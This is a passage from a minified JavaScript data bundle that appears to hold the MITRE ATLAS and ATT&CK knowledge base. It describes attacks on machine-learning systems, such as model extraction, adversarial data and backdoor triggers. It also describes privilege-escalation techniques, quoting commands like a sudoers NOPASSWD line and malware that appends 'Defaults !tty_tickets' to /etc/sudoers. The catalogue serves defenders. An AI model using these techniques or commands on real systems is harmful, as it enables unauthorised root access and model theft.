out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ";hl.external_references=[{external_id:i,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0007",source_name:b}];hl.techniques=[hm,ho,hp];hm.id=hn;hm.name="Discover ML Model Ontology";hm["object-type"]=a;hm.description="Adversaries may discover the ontology of a machine learning model's output space, for example, the types of objects a model can detect.\nThe adversary may discovery the ontology by repeated queries to the model, forcing it to enumerate its output space.\nOr the ontology may be discovered in a configuration file or in documentation about the model.\n\nThe model ontology helps the adversary understand how the model is being used by the victim.\nIt is useful to the adversary in creating targeted attacks.\n";hm.tactics=[i];ho.id="AML.T0014";ho.name="Discover ML Model Family";ho["object-type"]=a;ho.description="Adversaries may discover the general family of model.\nGeneral information about the model may be revealed in documentation, or the adversary may used carefully constructed examples and analyze the model's responses to categorize it.\n\nKnowledge of the model family can help the adversary identify means of attacking the model and help tailor the attack.\n";ho.tactics=[i];hp.id="AML.T0007";hp.name="Discover ML Artifacts";hp["object-type"]=a;hp.description="Adversaries may search private sources to identify machine learning artifacts that exist on the system and gather information about them.\nThese artifacts can include the software stack used to train and deploy models, training and testing data management systems, docker registries, software repositories, and model zoos.\n\nThis information can be used to identify targets for further collection, exfiltration, or disruption, and to tailor and improve attacks.\n";hp.tactics=[i];hq.id=m;hq["object-type"]=t;hq.name="Collection";hq.description="The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.";hq.external_references=[{external_id:m,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0009",source_name:b}];hq.techniques=[hr];hr.id=hs;hr.name="ML Artifact Collection";hr["object-type"]=a;hr.description="After identifying machine learning artifacts existing on the network, adversaries may collect them for \u003Ca href='\u002Ftactics\u002FTA0010'\u003EExfiltration\u003C\u002Fa\u003E or for use in \u003Ca href='\u002Ftactics\u002FAML.TA0001'\u003EML Attack Staging\u003C\u002Fa\u003E.\n";hr.tactics=[m];ht.id=n;ht.name="ML Attack Staging";ht["object-type"]=t;ht.description="An adversary is leveraging their knowledge of and access to the target system to tailor the attack.\n\nML Attack Staging consists of techniques adversaries use to prepare their attack on the target ML model.\nTechniques can include training proxy models, poisoning the target model, and crafting adversarial data to feed the target model.\nSome of these techniques can be performed in an offline manor and are thus difficult to mitigate.\nThese techniques are often used to achieve the adversary's end goal.\n";ht.techniques=[hu,hv,dE,hx,hy];hu.id=bj;hu.name="Train Proxy ML Model";hu["object-type"]=a;hu.description="Adversaries may train models to serve as proxies for the target model in use at the victim organization.\nProxy models are used to simulate complete access to the target model in a fully offline manner.\nThis can be used to develop attacks that require higher levels of access than the adversary has available or as a means to validate pre-existing attacks without interacting with the target model.\n";hu.tactics=[n];hv.id=hw;hv.name="Replicate ML Model";hv["object-type"]=a;hv.description="Adversaries may replicate a private model.\nBy repeatedly querying the victim's \u003Ca href='\u002Ftechniques\u002FAML.T0040'\u003EML Model Inference API Access\u003C\u002Fa\u003E, the adversary can collect the target model's inferences into a dataset.\nThe inferences are used as labels for training a separate model offline that will mimic the behavior and performance of the target model.\n\nA replicated model that closely mimic's the target model is a valuable resource in staging the attack.\nThe adversary can use the replicated model to \u003Ca href='\u002Ftechniques\u002FAML.T0043'\u003ECraft Adversarial Data\u003C\u002Fa\u003E for various purposes (e.g. \u003Ca href='\u002Ftechniques\u002FAML.T0015'\u003EEvade ML Model\u003C\u002Fa\u003E, \u003Ca href='\u002Ftechniques\u002FAML.T0046'\u003ESpamming ML System with Chaff Data\u003C\u002Fa\u003E).\n";hv.tactics=[n];hx.id=dG;hx.name="Verify Attack";hx["object-type"]=a;hx.description="Adversaries can verify the efficacy of their attack via an inference API or access to an offline copy of the target model.\nThis gives the adversary confidence that their approach works and allows them to carry out the attack at a later time of their choosing.\nThe adversary may verify the attack once but use it against many edge devices running copies of the target model.\nThe adversary may verify their attack digitally, then deploy it in the \u003Ca href='\u002Ftechniques\u002FAML.T0041'\u003EPhysical Environment Access\u003C\u002Fa\u003E at a later time.\nVerifying the attack may be hard to detect since the adversary can use a minimal number of queries or an offline copy of the model.\n";hx.tactics=[n];hy.id=ag;hy.name="Craft Adversarial Data";hy["object-type"]=a;hy.description="Adversarial data are inputs to a machine learning model that have been modified such that they cause the adversary's desired effect in the target model.\nEffects can range from misclassification, to missed detections, to maximising energy consumption.\nTypically, the modification is constrained in magnitude or location so that a human still perceives the data as if it were unmodified, but human perceptibility may not always be a concern depending on the adversary's intended effect.\nFor example, an adversarial input for an image classification task is an image the machine learning model would misclassify, but a human would still recognize as containing the correct class.\n\nDepending on the adversary's knowledge of and access to the target model, the adversary may use different classes of algorithms to develop the adversarial example such as \u003Ca href='\u002Ftechniques\u002FAML.T0043.000'\u003EWhite-Box Optimization\u003C\u002Fa\u003E, \u003Ca href='\u002Ftechniques\u002FAML.T0043.001'\u003EBlack-Box Optimization\u003C\u002Fa\u003E, \u003Ca href='\u002Ftechniques\u002FAML.T0043.002'\u003EBlack-Box Transfer\u003C\u002Fa\u003E, or \u003Ca href='\u002Ftechniques\u002FAML.T0043.003'\u003EManual Modification\u003C\u002Fa\u003E.\n\nThe adversary may \u003Ca href='\u002Ftechniques\u002FAML.T0042'\u003EVerify Attack\u003C\u002Fa\u003E their approach works if they have white-box or inference API access to the model.\nThis allows the adversary to gain confidence their attack is effective \"live\" environment where their attack may be noticed.\nThey can then use the attack at a later time to accomplish their goals.\nAn adversary may optimize adversarial examples for \u003Ca href='\u002Ftechniques\u002FAML.T0015'\u003EEvade ML Model\u003C\u002Fa\u003E, or to \u003Ca href='\u002Ftechniques\u002FAML.T0031'\u003EErode ML Model Integrity\u003C\u002Fa\u003E.\n";hy.tactics=[n];hy.subtechniques=[hz,hA,hB,hC,hD];hz.id=bY;hz.name="White-Box Optimization";hz["object-type"]=a;hz.description="In White-Box Optimization, the adversary has full access to the target model and optimizes the adversarial example directly.\nAdversarial examples trained in this manor are most effective against the target model.\n";hz["subtechnique-of"]=ag;hA.id=dH;hA.name="Black-Box Optimization";hA["object-type"]=a;hA.description="In Black-Box attacks, the adversary has black-box (i.e. \u003Ca href='\u002Ftechniques\u002FAML.T0040'\u003EML Model Inference API Access\u003C\u002Fa\u003E via API access) access to the target model.\nWith black-box attacks, the adversary may be using an API that the victim is monitoring.\nThese attacks are generally less effective and require more inferences than \u003Ca href='\u002Ftechniques\u002FAML.T0043.000'\u003EWhite-Box Optimization\u003C\u002Fa\u003E attacks, but they require much less access.\n";hA["subtechnique-of"]=ag;hB.id=dI;hB.name="Black-Box Transfer";hB["object-type"]=a;hB.description="In Black-Box Transfer attacks, the adversary uses one or more proxy models (trained via \u003Ca href='\u002Ftechniques\u002FAML.T0005'\u003ETrain Proxy ML Model\u003C\u002Fa\u003E or \u003Ca href='\u002Ftechniques\u002FAML.T0006'\u003EReplicate ML Model\u003C\u002Fa\u003E) models they have full access to and are representative of the target model.\nThe adversary uses \u003Ca href='\u002Ftechniques\u002FAML.T0043.000'\u003EWhite-Box Optimization\u003C\u002Fa\u003E on the proxy models to generate adversarial examples.\nIf the set of proxy models are close enough to the target model, the adversarial example should generalize from one to another.\nThis means that an attack that works for the proxy models will likely then work for the target model.\nIf the adversary has \u003Ca href='\u002Ftechniques\u002FAML.T0040'\u003EML Model Inference API Access\u003C\u002Fa\u003E, they may use this \u003Ca href='\u002Ftechniques\u002FAML.T0042'\u003EVerify Attack\u003C\u002Fa\u003E that the attack is working and incorporate that information into their training process.\n";hB["subtechnique-of"]=ag;hC.id=dJ;hC.name="Manual Modification";hC["object-type"]=a;hC.description="Adversaries may manually modify the input data to craft adversarial data.\nThey may use their knowledge of the target model to modify parts of the data they suspect helps the model in performing its task.\nThe adversary may use trial and error until they are able to verify they have a working adversarial input.\n";hC["subtechnique-of"]=ag;hD.id="AML.T0043.004";hD.name="Insert Backdoor Trigger";hD["object-type"]=a;hD.description="The adversary may add a perceptual trigger into inference data.\nThe trigger may be imperceptible or non-obvious to humans.\nThis technique is used in conjunction with \u003Ca href='\u002Ftechniques\u002FAML.T0018'\u003EPoison ML Model\u003C\u002Fa\u003E and allows the adversary to produce their desired effect in the target model.\n";hD["subtechnique-of"]=ag;hE.id=J;hE["object-type"]=t;hE.name="Exfiltration";hE.description="The adversary is trying to steal data.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.";hE.external_references=[{external_id:J,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0010",source_name:b}];hE.techniques=[hF];hF.id=bZ;hF.name="Exfiltration via ML Inference API";hF["object-type"]=a;hF.description="Adversaries may exfiltrate private information via \u003Ca href='\u002Ftechniques\u002FAML.T0040'\u003EML Model Inference API Access\u003C\u002Fa\u003E.\nML Models have been shown leak private information about their training data (e.g.  \u003Ca href='\u002Ftechniques\u002FAML.T0024.000'\u003EInfer Training Data Membership\u003C\u002Fa\u003E, \u003Ca href='\u002Ftechniques\u002FAML.T0024.001'\u003EInvert ML Model\u003C\u002Fa\u003E).\nThe model itself may also be extracted (\u003Ca href='\u002Ftechniques\u002FAML.T0024.002'\u003EExtract ML Model\u003C\u002Fa\u003E) for the purposes of \u003Ca href='\u002Ftechniques\u002FAML.T0045'\u003EML Intellectual Property Theft\u003C\u002Fa\u003E.\n\nExfiltration of information relating to private training data raises privacy concerns.\nPrivate training data may include personally identifiable information, or other protected data.\n";hF.tactics=[J];hF.subtechniques=[hG,hH,hI];hG.id="AML.T0024.000";hG.name="Infer Training Data Membership";hG["object-type"]=a;hG.description="Adversaries may infer the membership of a data sample in its training set, which raises privacy concerns.\nSome strategies make use of a shadow model that could be obtained via \u003Ca href='\u002Ftechniques\u002FAML.T0006'\u003EReplicate ML Model\u003C\u002Fa\u003E, others use statistics of model prediction scores.\n\nThis can cause the victim model to leak private information, such as PII of those in the training set or other forms of protected IP.\n";hG["subtechnique-of"]=bZ;hH.id="AML.T0024.001";hH.name="Invert ML Model";hH["object-type"]=a;hH.description="Machine learning models' training data could be reconstructed by exploiting the confidence scores that are available via an inference API.\nBy querying the inference API strategically, adversaries can back out potentially private information embedded within the training data.\nThis could lead to privacy violations if the attacker can reconstruct the data of sensitive features used in the algorithm.\n";hH["subtechnique-of"]=bZ;hI.id="AML.T0024.002";hI.name="Extract ML Model";hI["object-type"]=a;hI.description="Adversaries may extract a functional copy of a private model.\nBy repeatedly querying the victim's \u003Ca href='\u002Ftechniques\u002FAML.T0040'\u003EML Model Inference API Access\u003C\u002Fa\u003E, the adversary can collect the target model's inferences into a dataset.\nThe inferences are used as labels for training a separate model offline that will mimic the behavior and performance of the target model.\n\nAdversaries may extract the model to avoid paying per query in a machine learning as a service setting.\nModel extraction is used for \u003Ca href='\u002Ftechniques\u002FAML.T0045'\u003EML Intellectual Property Theft\u003C\u002Fa\u003E.\n";hI["subtechnique-of"]=bZ;hJ.id=j;hJ["object-type"]=t;hJ.name="Impact";hJ.description="The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.";hJ.external_references=[{external_id:j,source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftactics\u002FTA0040"}];hJ.techniques=[dF,hK,hL,hM,hO,hP];hK.id="AML.T0029";hK.name="Denial of ML Service";hK["object-type"]=a;hK.description="Adversaries may target machine learning systems with a flood of requests for the purpose of degrading or shutting down the service.\nSince many machine learning systems require significant amounts of specialized compute, they are often expensive bottlenecks that can become overloaded.\nAdversaries can intentionally craft inputs that require heavy amounts of useless compute from the machine learning system.\n";hK.tactics=[j];hL.id="AML.T0046";hL.name="Spamming ML System with Chaff Data";hL["object-type"]=a;hL.description="Adversaries may spam the machine learning system with chaff data that causes increase in the number of detections.\nThis can cause analysts at the victim organization to waste time reviewing and correcting incorrect inferences.\n";hL.tactics=[j];hM.id=hN;hM.name="Erode ML Model Integrity";hM["object-type"]=a;hM.description="Adversaries may degrade the target model's performance with adversarial data inputs to erode confidence in the system over time.\nThis can lead to the victim organization wasting time and money both attempting to fix the system and performing the tasks it was meant to automate by hand.\n";hM.tactics=[j];hO.id="AML.T0034";hO.name="Cost Harvesting";hO["object-type"]=a;hO.description="Adversaries may target different machine learning services to send useless queries or computationally expensive inputs to increase the cost of running services at the victim organization.\nSponge examples are a particular type of adversarial data designed to maximize energy consumption and thus operating cost.\n";hO.tactics=[j];hP.id=hQ;hP.name="ML Intellectual Property Theft";hP["object-type"]=a;hP.description="Adversaries may exfiltrate ML artifacts to steal intellectual property and cause economic harm to the victim organization.\n\nProprietary training data is costly to collect and annotate and may be a target for \u003Ca href='\u002Ftactics\u002FTA0010'\u003EExfiltration\u003C\u002Fa\u003E and theft.\n\nMLaaS providers charge for use of their API.\nAn adversary who has stolen a model via \u003Ca href='\u002Ftactics\u002FTA0010'\u003EExfiltration\u003C\u002Fa\u003E or via \u003Ca href='\u002Ftechniques\u002FAML.T0024.002'\u003EExtract ML Model\u003C\u002Fa\u003E now has unlimited use of that service without paying the owner of the intellectual property.\n";hP.tactics=[j];hR.id=hS;hR["object-type"]=a;hR.name="Bypass User Account Control";hR.description="Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Fitpro\u002Fwindows\u002Fkeep-secure\u002Fhow-user-account-control-works'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F001'\u003EComponent Object Model\u003C\u002Fa\u003E objects without prompting the user through the UAC notification box. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-US\u002Fmagazine\u002F2009.07.uac.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fms679687.aspx'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E An example of this is use of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F011'\u003ERundll32\u003C\u002Fa\u003E to load a specifically crafted DLL which loads an auto-elevated \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1559\u002F001'\u003EComponent Object Model\u003C\u002Fa\u003E object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.pretentiousname.com\u002Fmisc\u002Fwin7_uac_whitelist2.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fhfiref0x\u002FUACME'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* \u003Ccode\u003Eeventvwr.exe\u003C\u002Fcode\u003E can auto-elevate and execute a specified binary or script.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2016\u002F08\u002F15\u002Ffileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.fortinet.com\u002F2016\u002F12\u002F16\u002Fmalicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fpen-testing.sans.org\u002Fblog\u002Fpen-testing\u002F2013\u002F08\u002F08\u002Fpsexec-uac-bypass'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";hR.external_references=[{source_name:b,external_id:hS,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1548\u002F002"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Fitpro\u002Fwindows\u002Fkeep-secure\u002Fhow-user-account-control-works",description:"Lich, B. (2016, May 31). How User Account Control Works. Retrieved June 3, 2016.",source_name:"TechNet How UAC Works"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Fen-US\u002Fmagazine\u002F2009.07.uac.aspx",description:"Russinovich, M. (2009, July). User Account Control: Inside Windows 7 User Account Control. Retrieved July 26, 2016.",source_name:"TechNet Inside UAC"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002Fms679687.aspx",description:"Microsoft. (n.d.). The COM Elevation Moniker. Retrieved July 26, 2016.",source_name:"MSDN COM Elevation"},{url:"http:\u002F\u002Fwww.pretentiousname.com\u002Fmisc\u002Fwin7_uac_whitelist2.html",description:"Davidson, L. (n.d.). Windows 7 UAC whitelist. Retrieved November 12, 2014.",source_name:"Davidson Windows"},{url:"https:\u002F\u002Fgithub.com\u002Fhfiref0x\u002FUACME",description:"UACME Project. (2016, June 16). UACMe. Retrieved July 26, 2016.",source_name:"Github UACMe"},{url:"https:\u002F\u002Fenigma0x3.net\u002F2016\u002F08\u002F15\u002Ffileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking\u002F",description:"Nelson, M. (2016, August 15). \"Fileless\" UAC Bypass using eventvwr.exe and Registry Hijacking. Retrieved December 27, 2016.",source_name:"enigma0x3 Fileless UAC Bypass"},{url:"https:\u002F\u002Fblog.fortinet.com\u002F2016\u002F12\u002F16\u002Fmalicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware",description:"Salvio, J., Joven, R. (2016, December 16). Malicious Macro Bypasses UAC to Elevate Privilege for Fareit Malware. Retrieved December 27, 2016.",source_name:"Fortinet Fareit"},{url:"http:\u002F\u002Fpen-testing.sans.org\u002Fblog\u002Fpen-testing\u002F2013\u002F08\u002F08\u002Fpsexec-uac-bypass",description:"Medin, T. (2013, August 8). PsExec UAC Bypass. Retrieved June 3, 2016.",source_name:"SANS UAC Bypass"},{url:"https:\u002F\u002Fenigma0x3.net\u002F2017\u002F03\u002F14\u002Fbypassing-uac-using-app-paths\u002F",description:"Nelson, M. (2017, March 14). Bypassing UAC using App Paths. Retrieved May 25, 2017.",source_name:"enigma0x3 sdclt app paths"},{url:"https:\u002F\u002Fenigma0x3.net\u002F2017\u002F03\u002F17\u002Ffileless-uac-bypass-using-sdclt-exe\u002F",description:"Nelson, M. (2017, March 17). \"Fileless\" UAC Bypass Using sdclt.exe. Retrieved May 25, 2017.",source_name:"enigma0x3 sdclt bypass"}];hR["subtechnique-of"]=aJ;hT.id=hU;hT["object-type"]=a;hT.name="Elevated Execution with Prompt";hT.description="Adversaries may leverage the \u003Ccode\u003EAuthorizationExecuteWithPrivileges\u003C\u002Fcode\u003E API to escalate privileges by prompting the user for credentials.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Fdocumentation\u002Fsecurity\u002F1540038-authorizationexecutewithprivileg'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. \n\nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse \u003Ccode\u003EAuthorizationExecuteWithPrivileges\u003C\u002Fcode\u003E to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fspeakerdeck.com\u002Fpatrickwardle\u002Fdefcon-2017-death-by-1000-installers-its-all-broken?slide=8'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.carbonblack.com\u002F2019\u002F02\u002F12\u002Ftau-threat-intelligence-notification-new-macos-malware-variant-of-shlayer-osx-discovered\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fobjective-see.com\u002Fblog\u002Fblog_0x2A.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This technique may be combined with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036'\u003EMasquerading\u003C\u002Fa\u003E to trick the user into granting escalated privileges to malicious code.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fspeakerdeck.com\u002Fpatrickwardle\u002Fdefcon-2017-death-by-1000-installers-its-all-broken?slide=8'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.carbonblack.com\u002F2019\u002F02\u002F12\u002Ftau-threat-intelligence-notification-new-macos-malware-variant-of-shlayer-osx-discovered\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fspeakerdeck.com\u002Fpatrickwardle\u002Fdefcon-2017-death-by-1000-installers-its-all-broken?slide=8'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";hT.external_references=[{source_name:b,external_id:hU,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1548\u002F004"},{source_name:"AppleDocs AuthorizationExecuteWithPrivileges",url:"https:\u002F\u002Fdeveloper.apple.com\u002Fdocumentation\u002Fsecurity\u002F1540038-authorizationexecutewithprivileg",description:"Apple. (n.d.). Apple Developer Documentation - AuthorizationExecuteWithPrivileges. Retrieved August 8, 2019."},{source_name:"Death by 1000 installers; it's all broken!",url:"https:\u002F\u002Fspeakerdeck.com\u002Fpatrickwardle\u002Fdefcon-2017-death-by-1000-installers-its-all-broken?slide=8",description:"Patrick Wardle. (2017). Death by 1000 installers; it's all broken!. Retrieved August 8, 2019."},{source_name:"Carbon Black Shlayer Feb 2019",url:"https:\u002F\u002Fwww.carbonblack.com\u002F2019\u002F02\u002F12\u002Ftau-threat-intelligence-notification-new-macos-malware-variant-of-shlayer-osx-discovered\u002F",description:"Carbon Black Threat Analysis Unit. (2019, February 12). New macOS Malware Variant of Shlayer (OSX) Discovered. Retrieved August 8, 2019."},{source_name:"OSX Coldroot RAT",url:"https:\u002F\u002Fobjective-see.com\u002Fblog\u002Fblog_0x2A.html",description:"Patrick Wardle. (2018, February 17). Tearing Apart the Undetected (OSX)Coldroot RAT. Retrieved August 8, 2019."}];hT["subtechnique-of"]=aJ;hV.id=hW;hV["object-type"]=a;hV.name="Setuid and Setgid";hV.description="An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002Fman2\u002Fsetuid.2.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via \u003Ccode\u003Els -l\u003C\u002Fcode\u003E. The \u003Ccode\u003Echmod\u003C\u002Fcode\u003E program can set these bits with via bitmasking, \u003Ccode\u003Echmod 4777 [file]\u003C\u002Fcode\u003E or via shorthand naming, \u003Ccode\u003Echmod u+s [file]\u003C\u002Fcode\u003E.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2016\u002F07\u002F06\u002Fnew-osxkeydnap-malware-hungry-credentials\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E.";hV.external_references=[{source_name:b,external_id:hW,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1548\u002F001"},{url:"http:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002Fman2\u002Fsetuid.2.html",description:"Michael Kerrisk. (2017, September 15). Linux Programmer's Manual. Retrieved September 21, 2018.",source_name:"setuid man page"},{url:b_,description:b$,source_name:ca}];hV["subtechnique-of"]=aJ;hX.id=hY;hX["object-type"]=a;hX.name="Sudo and Sudo Caching";hX.description="Adversaries may perform sudo caching and\u002For use the suoders file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The \u003Ccode\u003Esudo\u003C\u002Fcode\u003E command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sudo.ws\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Since sudo was made for the system administrator, it has some useful configuration features such as a \u003Ccode\u003Etimestamp_timeout\u003C\u002Fcode\u003E, which is the amount of time in minutes between instances of \u003Ccode\u003Esudo\u003C\u002Fcode\u003E before it will re-prompt for a password. This is because \u003Ccode\u003Esudo\u003C\u002Fcode\u003E has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at \u003Ccode\u003E\u002Fvar\u002Fdb\u002Fsudo\u003C\u002Fcode\u003E with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a \u003Ccode\u003Etty_tickets\u003C\u002Fcode\u003E variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, \u003Ccode\u003E\u002Fetc\u002Fsudoers\u003C\u002Fcode\u003E, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like \u003Ccode\u003Euser1 ALL=(ALL) NOPASSWD: ALL\u003C\u002Fcode\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fthreat-analysis\u002F2017\u002F04\u002Fnew-osx-dok-malware-intercepts-web-traffic\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, \u003Ccode\u003E\u002Fvar\u002Fdb\u002Fsudo\u003C\u002Fcode\u003E's timestamp can be monitored to see if it falls within the \u003Ccode\u003Etimestamp_timeout\u003C\u002Fcode\u003E range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if \u003Ccode\u003Etty_tickets\u003C\u002Fcode\u003E is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled \u003Ccode\u003Etty_tickets\u003C\u002Fcode\u003E to potentially make scripting easier by issuing \u003Ccode\u003Eecho \\'Defaults !tty_tickets\\' \u003E\u003E \u002Fetc\u002Fsudoers\u003C\u002Fcode\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cybereason.com\u002Fblog\u002Flabs-proton-b-what-this-mac-malware-actually-does'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. In order for this change to be reflected, the malware also issued \u003Ccode\u003Ekillall Terminal\u003C\u002Fcode\u003E. As of macOS Sierra, the sudoers file has \u003Ccode\u003Etty_tickets\u003C\u002Fcode\u003E enabled by default.";hX.external_references=[{source_name:b,external_id:hY,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1548\u002F003"},{url:"https:\u002F\u002Fwww.sudo.ws\u002F",description:"Todd C. Miller. (2018). Sudo Man Page. Retrieved March 19, 2018.",source_name:"sudo man page 2018"},{url:dK,description:dL,source_name:dM},{url:"https:\u002F\u002Fwww.cybereason.com\u002Fblog\u002Flabs-proton-b-what-this-mac-malware-actually-does",description:"Amit Serper. (2018, May 10). ProtonB What this Mac Malware Actually Does. Retrieved March 19, 2018.",source_name:"cybereason osx 